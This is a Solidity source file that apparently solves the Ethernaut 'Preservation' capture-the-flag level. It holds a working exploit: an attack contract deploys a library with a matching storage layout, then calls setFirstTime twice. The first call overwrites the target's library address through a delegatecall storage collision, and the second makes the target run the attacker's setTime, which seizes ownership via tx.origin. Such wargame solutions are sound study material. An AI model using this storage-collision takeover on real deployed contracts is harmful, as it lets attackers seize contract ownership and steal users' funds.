// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract PreservationAttk is Broadcasted {
    address private s_myLibrary;

    function attack(address payable preservationCtr_) public payable override {
        // call to set the corrupted library as the timezone 1 library
        _callSetFirstTime(preservationCtr_);
        // call to invoque the setTime function of the corrupted library and change the contract owner
        _callSetFirstTime(preservationCtr_);
    }

    function _callSetFirstTime(address payable preservationCtr_) private {
        // set the corrupted library as the timezone 1 library
        // second time this function is called the time does not import because it will not be used
        IPreservation(preservationCtr_).setFirstTime(
            uint256(uint160(_getMyLibrary()))
        );
    }

    function broadcastedAttack(
        address payable levelInstanceCtr_
    ) external payable override {
        // deploy my corrupted library
        MyLibrary _myLib = new MyLibrary();
        _setMyLibrary(address(_myLib));
        // call attack, intentionally not broadcasted
        attack(levelInstanceCtr_);
    }

    function _getMyLibrary() private view returns (address) {
        return s_myLibrary;
    }

    function _setMyLibrary(address myLibrary_) private {
        s_myLibrary = myLibrary_;
    }
}

interface IPreservation {
    function setFirstTime(uint timeStamp_) external;
}

contract MyLibrary {
    // stores a timestamp
    address public s_randomAddr1; // random address to fill slots
    address public s_randomAddr2;
    address public s_owner;

    function setTime(uint256) public {
        s_owner = tx.origin;
    }
}
